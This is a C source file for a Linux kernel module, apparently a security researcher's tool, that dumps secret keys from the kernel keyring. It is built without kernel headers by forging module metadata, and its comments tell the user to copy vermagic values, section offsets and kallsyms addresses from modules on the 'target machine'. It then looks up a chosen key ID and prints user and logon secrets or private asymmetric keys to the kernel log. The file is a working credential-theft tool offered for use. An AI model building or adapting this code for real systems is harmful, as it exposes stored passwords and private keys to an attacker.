/*** When provided with a key in the KEYID field - it will dump the specific key 
 *   the keytype must also be defined. 
 *   Build using gcc -c single_key_dump.c -o keydumper.ko
 * **/

/**** NAME: Can be any value up to 64 chars****/
#define NAME "ivision" 

/**** VERMAGIC: Find an existing kernel module on the target machine and copy the VERMAGIC using:
 *  objdump -j .modinfo -s <KERNEL_MODULE>.ko
 *
****/
#define VERMAGIC "6.6.32 SMP preempt mod_unload "

/**** GNU_LINK_SIZE: Find an existing kernel module on the target machine and copy the size using:
 *  objdump -j .gnu.linkonce.this_module -h <KERNEL_MODULE>.ko
 *  You want the 3rd value - in the following example, we would use  0x440
 *
Sections:
Idx Name          Size      VMA               LMA               File off  Algn
 10 .gnu.linkonce.this_module 00000440  0000000000000000  0000000000000000  00000a80  2**6
                  CONTENTS, ALLOC, LOAD, RELOC, DATA, LINK_ONCE_DISCARD
****/
#define GNU_LINK_SIZE 0x440

/**** GNU_LINK_NAME_OFFSET: Find an existing kernel module on the target machine and copy the offset using:
 *  objdump -j .gnu.linkonce.this_module -s <KERNEL_MODULE>.ko
 *  You want to count the offset where the name starts - in the following case we would use 0x18
 *
Contents of section .gnu.linkonce.this_module:
 0000 00000000 00000000 00000000 00000000  ................
 0010 00000000 00000000 6c6c6300 00000000  ........llc.....
 0020 00000000 00000000 00000000 00000000  ................
 0030 00000000 00000000 00000000 00000000  ................
****/

#define GNU_LINK_NAME_OFFSET 0x18

/**** INIT_LOCATION, CLEANUP_LOCATION: Find an existing kernel module on the target machine and copy the size using:
 *  objdump -j .gnu.linkonce.this_module -r <KERNEL_MODULE>.ko
 *  You want both of the offsets - in the following example we would use  0x138 for INIT_LOCATION and 0x3f8 for cleanup_module
 *
 *
RELOCATION RECORDS FOR [.gnu.linkonce.this_module]:
OFFSET           TYPE              VALUE
0000000000000138 R_X86_64_64       init_module
00000000000003f8 R_X86_64_64       cleanup_module
****/
#define INIT_LOCATION  0x138
#define CLEANUP_LOCATION 0x3f8

/**** KEYTYPE - The type of the key being dumped. Valid options: user, logon, asymmetric ****/
#define KEYTYPE "logon"

/**** KEYID - The ID of the key being dumped. Can be obatined using `keyctl list @u` ****/
#define KEYID 582701619


/**** Update the following function addresses. The values can be obtained by using grep "<FUNCTION>" /proc/kallsyms ***/ 
int (*_strcmp)(char*, char*) = (void*) 0xffffffff817692d0;
int (*_printk)(const char *) = (void*) 0xffffffff810c1da0;
struct key* (*key_lookup)(unsigned long keyID) = (void*) 0xffffffff812a6cb0;
int (*print_hex_dump)(const char *, const char *, int, int,int, void*, int, int) = (void*) 0xffffffff813161c0;

enum {
	DUMP_PREFIX_NONE,
	DUMP_PREFIX_ADDRESS,
	DUMP_PREFIX_OFFSET
};

// Key struct copied from https://elixir.bootlin.com/linux/v6.6.32/source/include/linux/key-type.h#L64 but modified to omit unused values
struct key {
  unsigned long usage;
  unsigned long serial;
  char __padding[152];
  char* description;
  void* payload;
};

void user_key_dump(void* payload){

  // user_key_payload struct copied from https://elixir.bootlin.com/linux/v6.6.32/source/include/keys/user-type.h#L27 but modified to omit unused values
  struct user_logon_key_payload{
    char __padding[16];
    unsigned short datalen;
    char __padding_2[6];
    char* data; 
  };

  struct user_logon_key_payload * user_logon_key = payload;
  print_hex_dump("USER/LOGON - ", "KEY:", DUMP_PREFIX_NONE, 32, 1, &(user_logon_key->data), user_logon_key->datalen, 1);

}

void asym_dump(void* payload){

   // public key struct copied from https://elixir.bootlin.com/linux/v6.6.32/source/include/crypto/public_key.h#L22 but modified to omit unused values
  struct  asym_key_payload{
    void *key;
    int keylen;
    int algo;
    void *params;
    int paramlen;
    int key_is_private;
    const char *id_type;
    const char *pkey_algo;
    unsigned long key_eflags;	
  };

  struct asym_key_payload * asym_key = payload;

  if(asym_key->key_is_private){
    print_hex_dump("Private - ", "ASYM KEY:", DUMP_PREFIX_NONE, 32, 1, asym_key->key, asym_key->keylen, 1);
  }else{
    print_hex_dump("Public - ", "ASYM KEY:", DUMP_PREFIX_NONE, 32, 1, asym_key->key, asym_key->keylen, 1);
  }

}


static int init(void){
  if(_strcmp(KEYTYPE, "") == 0){
    _printk("keytype NEEDED: user, logon, asymmetric\n");
    return 0;
  }
  if(KEYID == 0){
    _printk("keyid NEEDED: keyctl show (int)\n");
    return 0;
  }

  if(_strcmp(KEYTYPE, "user") == 0 || _strcmp(KEYTYPE, "logon") == 0){
    struct key* user_key = key_lookup(KEYID);
    user_key_dump(user_key->payload);
  }else if(_strcmp(KEYTYPE, "asymmetric") == 0){
    struct key* asym_key = key_lookup(KEYID);
    asym_dump(asym_key->payload);
  }else{
    _printk("Invalid keytype\n");
  }

  return 0;
}


void cleanup(void){
}

/*** Configure Kernel module ELF section headers **/
const char modinfo[100]  __attribute__((section(".modinfo"))) = "name=" NAME "\x00vermagic=" VERMAGIC;
const char plt[0x000001] __attribute__ ((section (".plt"))) = "\x00"; 
const char init_plt[0x000001] __attribute__ ((section (".init.plt"))) = "\x00"; 

struct module { 
    char __padding[GNU_LINK_NAME_OFFSET];
    char name [sizeof(NAME)];
    char __padding1[INIT_LOCATION-GNU_LINK_NAME_OFFSET-sizeof(NAME)];
    void *init;
    char __padding2[CLEANUP_LOCATION-INIT_LOCATION-sizeof(void*)];
    void *cleanup;
    char __padding3[GNU_LINK_SIZE-CLEANUP_LOCATION-sizeof(void*)];
}__attribute__((packed));

struct module tmp __attribute__ ((section (".gnu.linkonce.this_module"))) =
{
  .name = NAME,
  .init = init, 
  .cleanup = cleanup, 
};


